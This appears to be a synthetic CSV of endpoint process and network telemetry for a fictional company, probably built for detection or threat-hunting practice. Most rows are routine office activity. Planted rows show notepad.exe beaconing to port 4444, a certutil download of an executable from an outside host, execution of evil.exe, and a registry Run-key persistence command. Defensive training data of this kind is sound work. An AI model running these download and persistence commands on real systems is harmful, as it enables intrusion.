timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-01 11:03:00,eng-ws-02,ethan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 11:04:00,fin-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",172.16.4.25,0,none
2026-04-01 11:05:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 11:06:00,ops-ws-02,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",104.18.20.12,443,outlook
2026-04-01 11:07:00,sales-lt-01,ethan,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-01 11:08:00,fin-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-01 11:09:00,ops-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 11:10:00,fin-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-01 11:11:00,hr-ws-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",192.168.10.9,445,none
2026-04-01 11:12:00,shared-jump-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-01 11:13:00,fin-ws-02,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-01 11:14:00,sales-lt-02,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 11:15:00,eng-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 11:16:00,sales-lt-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
2026-04-01 11:17:00,sales-lt-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",23.45.67.89,443,outlook
2026-04-01 11:18:00,eng-ws-01,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 11:19:00,eng-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 11:20:00,shared-jump-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-01 11:21:00,hr-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-01 11:22:00,sales-lt-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 11:23:00,sales-lt-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
2026-04-01 11:24:00,hr-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
2026-04-01 11:25:00,shared-jump-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 11:26:00,fin-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 11:27:00,fin-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-01 11:28:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 11:29:00,shared-jump-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 11:29:00,eng-ws-01,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 11:30:00,fin-ws-02,ethan,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 11:30:00,eng-ws-01,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 11:31:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 11:32:00,hr-ws-01,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.0.2.20,0,none
2026-04-01 11:33:00,ops-ws-02,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
2026-04-01 11:34:00,fin-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 11:35:00,fin-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-01 11:36:00,sales-lt-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 11:37:00,ops-ws-02,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 11:38:00,sales-lt-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 11:39:00,ops-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 11:40:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",10.0.0.5,0,none
2026-04-01 11:41:00,hr-ws-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
2026-04-01 11:42:00,sales-lt-02,helen,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 11:43:00,shared-jump-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 11:44:00,eng-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",142.250.183.14,443,outlook
2026-04-01 11:45:00,ops-ws-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 11:46:00,fin-ws-01,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 11:47:00,hr-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",192.168.10.9,445,none
2026-04-01 11:48:00,eng-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,edge
2026-04-01 11:49:00,ops-ws-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",172.16.10.8,445,none
2026-04-01 11:50:00,sales-lt-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 11:51:00,sales-lt-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-01 11:52:00,ops-ws-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",192.168.1.12,445,none
2026-04-01 11:53:00,sales-lt-01,alice,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-01 11:54:00,sales-lt-02,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 11:55:00,sales-lt-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-01 11:56:00,fin-ws-01,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
2026-04-01 11:57:00,sales-lt-02,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-01 11:58:00,sales-lt-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.1.15,0,none
2026-04-01 11:59:00,sales-lt-01,ethan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
2026-04-01 12:00:00,ops-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 12:01:00,sales-lt-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 12:02:00,shared-jump-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-01 12:03:00,eng-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",172.16.10.8,445,none
2026-04-01 12:04:00,ops-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 12:05:00,hr-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,151.101.1.69,443,zoom-client
2026-04-01 12:06:00,fin-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,151.101.1.69,443,slack-client
2026-04-01 12:07:00,ops-ws-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
2026-04-01 12:08:00,ops-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",45.33.32.156,443,outlook
2026-04-01 12:09:00,fin-ws-02,julia,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
2026-04-01 12:10:00,ops-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",151.101.1.69,443,outlook
2026-04-01 12:10:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 12:11:00,ops-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.1.15,0,none
2026-04-01 12:11:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 12:12:00,sales-lt-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 12:13:00,ops-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 12:14:00,sales-lt-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
2026-04-01 12:15:00,fin-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
2026-04-01 12:16:00,ops-ws-01,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-01 12:17:00,eng-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 12:18:00,ops-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 12:19:00,sales-lt-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 12:20:00,fin-ws-02,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-01 12:21:00,ops-ws-02,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.0.0.10,445,none
2026-04-01 12:22:00,sales-lt-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 12:23:00,eng-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",8.8.8.8,443,outlook
2026-04-01 12:24:00,hr-ws-01,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",142.250.183.14,443,outlook
2026-04-01 12:25:00,fin-ws-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 12:26:00,shared-jump-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 12:27:00,shared-jump-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
2026-04-01 12:28:00,sales-lt-01,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-01 12:29:00,hr-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-01 12:30:00,sales-lt-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 12:31:00,fin-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
2026-04-01 12:32:00,shared-jump-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",172.16.10.8,0,none
2026-04-01 12:33:00,hr-ws-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 12:34:00,ops-ws-02,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-01 12:35:00,shared-jump-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
2026-04-01 12:36:00,hr-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",172.16.10.8,0,none
2026-04-01 12:37:00,hr-ws-01,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
2026-04-01 12:38:00,shared-jump-01,helen,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-01 12:38:00,eng-ws-02,alice,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 12:39:00,shared-jump-01,farah,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 12:39:00,eng-ws-02,alice,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 12:40:00,shared-jump-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.1.15,0,none
2026-04-01 12:41:00,eng-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-01 12:42:00,eng-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",23.45.67.89,443,outlook
2026-04-01 12:43:00,eng-ws-02,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",142.250.183.14,443,outlook
2026-04-01 12:44:00,fin-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
2026-04-01 12:45:00,sales-lt-02,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 12:46:00,hr-ws-01,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.1.5.12,445,none
2026-04-01 12:47:00,ops-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 12:48:00,fin-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",172.16.10.8,0,none
2026-04-01 12:49:00,sales-lt-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 12:50:00,hr-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
2026-04-01 12:51:00,hr-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 12:52:00,eng-ws-02,diana,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 12:53:00,shared-jump-01,irfan,outlook.exe,explorer.exe,"outlook.exe /recycle ""irfan@company.com""",45.33.32.156,443,outlook
2026-04-01 12:54:00,eng-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-01 12:55:00,ops-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-01 12:56:00,hr-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 12:57:00,sales-lt-02,charlie,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 12:58:00,ops-ws-01,irfan,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
2026-04-01 12:59:00,ops-ws-02,bob,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
2026-04-01 13:00:00,hr-ws-01,alice,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 13:01:00,fin-ws-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 13:02:00,ops-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",172.16.4.25,0,none
2026-04-01 13:03:00,sales-lt-02,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
2026-04-01 13:04:00,fin-ws-02,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 13:05:00,fin-ws-02,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 13:06:00,fin-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.2.20,445,none
2026-04-01 13:06:00,eng-ws-02,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-01 13:07:00,eng-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-01 13:07:00,eng-ws-02,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-01 13:08:00,fin-ws-02,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.0.1.15,445,none
2026-04-01 13:09:00,shared-jump-01,alice,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 13:10:00,fin-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-01 13:11:00,eng-ws-02,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 13:12:00,fin-ws-02,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",8.8.8.8,443,outlook
2026-04-01 13:13:00,fin-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-01 13:14:00,ops-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
2026-04-01 13:15:00,sales-lt-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
2026-04-01 13:16:00,sales-lt-01,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-01 13:17:00,sales-lt-02,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
2026-04-01 13:18:00,eng-ws-01,helen,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
2026-04-01 13:19:00,eng-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-01 13:20:00,eng-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",23.45.67.89,443,outlook
2026-04-01 13:21:00,eng-ws-02,charlie,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-01 13:22:00,ops-ws-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 13:23:00,hr-ws-01,helen,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
2026-04-01 13:24:00,eng-ws-02,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",192.168.10.9,0,none
2026-04-01 13:25:00,fin-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,45.33.32.156,443,teams-client
2026-04-01 13:26:00,ops-ws-02,farah,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
2026-04-01 13:27:00,ops-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",142.250.183.14,443,outlook
2026-04-01 13:28:00,ops-ws-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",23.45.67.89,443,outlook
2026-04-01 13:29:00,sales-lt-01,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-01 13:30:00,ops-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-01 13:31:00,fin-ws-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-01 13:32:00,ops-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
2026-04-01 13:33:00,ops-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-01 13:34:00,ops-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 13:35:00,fin-ws-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",192.168.1.12,0,none
2026-04-01 13:36:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",185.199.108.153,443,outlook
2026-04-01 13:37:00,ops-ws-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.1.5.12,445,none
2026-04-01 13:38:00,shared-jump-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",172.16.10.8,445,none
2026-04-01 13:39:00,sales-lt-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
2026-04-01 13:40:00,eng-ws-01,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.1.5.12,0,none
2026-04-01 13:41:00,eng-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-01 13:42:00,ops-ws-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-01 13:43:00,shared-jump-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-01 13:44:00,eng-ws-01,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-01 13:45:00,fin-ws-02,george,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
2026-04-01 13:46:00,ops-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",52.95.110.1,443,outlook
2026-04-01 13:47:00,ops-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
2026-04-01 13:48:00,eng-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-01 13:49:00,eng-ws-02,ethan,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
2026-04-01 13:50:00,sales-lt-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
2026-04-01 13:51:00,hr-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",192.168.10.9,445,none
2026-04-01 13:52:00,eng-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
2026-04-01 13:53:00,hr-ws-01,julia,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
2026-04-01 13:54:00,hr-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-01 13:55:00,shared-jump-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
2026-04-01 13:56:00,fin-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.1.5.12,445,none
2026-04-01 13:57:00,hr-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,edge
2026-04-01 13:58:00,ops-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-01 13:59:00,fin-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
2026-04-01 13:59:00,eng-ws-02,irfan,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-01 14:00:00,eng-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-01 14:00:00,eng-ws-02,irfan,evil.exe,explorer.exe,C:\Users\irfan\AppData\Local\Temp\evil.exe,10.1.5.12,0,none
2026-04-01 14:01:00,ops-ws-02,alice,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
2026-04-01 14:01:00,eng-ws-02,irfan,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
2026-04-01 14:02:00,ops-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
2026-04-01 14:03:00,ops-ws-02,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-01 14:04:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.1.12,445,none
2026-04-01 14:05:00,ops-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.10,0,none
2026-04-01 14:06:00,fin-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
2026-04-01 14:07:00,sales-lt-02,bob,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
2026-04-01 14:08:00,ops-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",23.45.67.89,443,outlook
2026-04-01 14:09:00,eng-ws-02,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",10.0.0.10,0,none
2026-04-01 14:10:00,sales-lt-02,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-01 14:11:00,ops-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
